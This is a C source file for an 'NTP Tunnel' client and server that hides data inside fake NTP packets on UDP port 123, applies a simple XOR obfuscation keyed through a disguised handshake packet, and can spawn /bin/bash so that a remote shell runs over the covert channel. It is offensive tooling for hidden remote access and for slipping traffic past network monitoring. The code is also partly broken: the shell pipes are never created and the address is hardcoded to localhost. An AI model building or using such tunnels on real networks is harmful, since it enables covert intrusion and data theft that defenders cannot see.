#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "packet.h"
#include "ntp.h"


#define OBFUSCATE_ENABLED 1
#define ERROR_ENABLED 1

#ifdef OBFUSCATE_ENABLED
    #define DEFAULT_KEY (char[]) {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
    #define KEY_SIZE 8
#endif


enum Option
{
    ListenOption = 1,
    ShellOption = 2,

    #ifdef OBFUSCATE_ENABLED
        ObfuscateOption = 4,
    #endif
} Option;

int main(int argc, char* argv[]) {   
    enum Option opt = 0;
    int gopt = 0;
    #ifdef OBFUSCATE_ENABLED
        while ((gopt = getopt(argc, argv, "losh")) != -1) {
    #else
        while ((gopt = getopt(argc, argv, "lsh")) != -1) {
    #endif
        switch (gopt) {
            case 'l': opt |= ListenOption; break;
            case 's': opt |= ShellOption; break;
            case 'h':
                #ifdef ERROR_ENABLED
                    printf("\nNTP Tunnel - A simple NTP data tunnel client/server\n\n");
                    #ifdef OBFUSTATE_ENABLED
                        printf("Usage: %s [-l] [-s] [-o] address\n", argv[0]);
                    #else
                        printf("Usage: %s [-l] [-s] [-o] address\n", argv[0]);
                    #endif
                    printf("\t-l\tListen on the specified address (for use on the server side)\n");
                    printf("\t-s\tSpawn a shell\n");
                    #ifdef OBFUSCATE_ENABLED
                        printf("\t-o\tObfuscate the connection (basic encryption)\n");
                    #endif
                    printf("\t-h\tPrint this help message\n");
                    printf("\n\taddress\tThe address to connect to\n");
                    printf("\n");
                    exit(EXIT_SUCCESS);
                #endif
                break;

            #ifdef OBFUSCATE_ENABLED
                case 'o': opt |= ObfuscateOption; break;
            #endif

            #ifdef ERROR_ENABLED
                default:
                    #ifdef OBFUSTATE_ENABLED
                        printf("Usage: %s [-l] [-s] [-o] address\n", argv[0]);
                    #else
                        printf("Usage: %s [-l] [-s] [-o] address\n", argv[0]);
                    #endif
                    exit(EXIT_FAILURE);
            #endif
        }
    }




    fd_set rfds;
    struct timeval tv = {10, 0};
    Packet* packet = packet_init(NTP_PACKET);
    char buffer[packet->size];

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    struct sockaddr_in server_addr, client_addr;
    socklen_t sock_struct_length = sizeof(server_addr);

    if(sockfd < 0){
        #ifdef ERROR_ENABLED
            fprintf(stderr, "Error: couldn't create socket\n");
        #endif
        return -1;
    }   

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(123);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (opt & ListenOption) {
        if(bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            #ifdef ERROR_ENABLED
                fprintf(stderr, "Error: couldn't bind to port\n");
            #endif
            return -1;
        }
    }

    FD_ZERO(&rfds);
    FD_SET(STDIN_FILENO, &rfds);
    FD_SET(sockfd, &rfds);

    #ifdef OBFUSCATE_ENABLED

        char key[KEY_SIZE] = DEFAULT_KEY;
        if (opt & ObfuscateOption && (!(opt & ListenOption))) {
            srand(time(NULL) ^ getpid());
            for (int i = 0; i < KEY_SIZE; i++) {
                key[i] = (char)rand();
            }
            packet->content = NTP_DEFAULT_CONTENT;
            memcpy(&packet->content[packet->content_size - KEY_SIZE], key, KEY_SIZE);
            sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
        } else {
            packet->content = NTP_DEFAULT_CONTENT;
            sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
        }
    #else
        packet->content = NTP_DEFAULT_CONTENT;
        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
    #endif

    pid_t p;
    int stat;
    int shell_in, shell_out;

    if (opt & ShellOption && !(p = fork())) {
        // Start shell in child process, with stdin and stdout redirected to reverse pipes for tunnel
        int pipefd[2];
        dup2(shell_out, STDIN_FILENO);
        dup2(shell_in, STDOUT_FILENO);
        close(shell_out);
        close(shell_in);
        execvp("/bin/bash", NULL);
        while (1) { wait(&stat); }
    } else {
        if (opt & ShellOption) {
            FD_ZERO(&rfds);
            FD_SET(STDIN_FILENO, &rfds);
            FD_SET(sockfd, &rfds);
        }
        while (1) {
            if(select(sockfd + 1, &rfds, NULL, NULL, &tv)) {
                if (FD_ISSET(STDIN_FILENO, &rfds)) {
                    memset(packet->content, 0, packet->content_size);
                    read(STDIN_FILENO, packet->content, packet->content_size);

                    #ifdef OBFUSCATE_ENABLED
                        if (opt & ObfuscateOption) {
                            for (int i = 0; i < packet->content_size; i++) {
                                packet->content[i] ^= key[i % KEY_SIZE] ^ i*i*i;
                            }
                        }
                    #endif
                    if (opt & ListenOption) {
                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&client_addr, sock_struct_length);
                    } else {
                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
                    }
                    FD_SET(sockfd, &rfds);
                } else {
                    memset(packet->content, 0, packet->content_size);
                    if (opt & ListenOption) {
                        recvfrom(sockfd, buffer, packet->size, 0, (struct sockaddr*)&client_addr, &sock_struct_length);
                    } else {
                        recvfrom(sockfd, buffer, packet->size, 0, (struct sockaddr*)&server_addr, &sock_struct_length);
                    }
                    packet_parse(packet, buffer);
                    if (opt & ObfuscateOption) {
                        if (strncmp(packet->content, NTP_DEFAULT_CONTENT, packet->content_size - KEY_SIZE) == 0) {
                            memcpy(key, &packet->content[packet->content_size - KEY_SIZE], KEY_SIZE);
                        } else {
                            for (int i = 0; i < packet->content_size; i++) {
                                packet->content[i] ^= key[i % KEY_SIZE] ^ i*i*i;
                            }
                            write(STDOUT_FILENO, packet->content, packet->content_size);
                            fflush(stdout);
                        }
                    } else {
                        if (strcmp(packet->content, NTP_DEFAULT_CONTENT)) {
                            write(STDOUT_FILENO, packet->content, packet->content_size);
                            fflush(stdout);
                        }
                    }
                    FD_SET(STDIN_FILENO, &rfds);
                }
            } else {            
                close(sockfd);
                sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

                if(sockfd < 0){
                    #ifdef ERROR_ENABLED
                        fprintf(stderr, "Error: couldn't create socket\n");
                    #endif
                    return -1;
                }

                struct sockaddr_in fresh_server_addr, fresh_client_addr;

                fresh_server_addr.sin_family = AF_INET;
                fresh_server_addr.sin_port = htons(123);
                fresh_server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

                server_addr = fresh_server_addr;
                client_addr = fresh_client_addr;

                if (opt & ListenOption) {
                    if(bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
                        #ifdef ERROR_ENABLED
                            fprintf(stderr, "Error: couldn't bind to port\n");
                        #endif
                        return -1;
                    }
                } else {
                    if (opt & ObfuscateOption) {
                        srand(time(NULL) ^ getpid());
                        for (int i = 0; i < KEY_SIZE; i++) {
                            key[i] = (char)rand();
                        }
                        packet->content = NTP_DEFAULT_CONTENT;
                        memcpy(&packet->content[packet->content_size - KEY_SIZE], key, KEY_SIZE);
                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
                    } else {
                        packet->content = NTP_DEFAULT_CONTENT;
                        sendto(sockfd, packet_stream(packet), packet->size, 0, (struct sockaddr*)&server_addr, sock_struct_length);
                    }
                }
                
                FD_ZERO(&rfds);
                FD_SET(STDIN_FILENO, &rfds);
                FD_SET(sockfd, &rfds);
            }
        }   
    }


    close(sockfd);
    packet_destroy(packet);
    
    exit(EXIT_SUCCESS);
}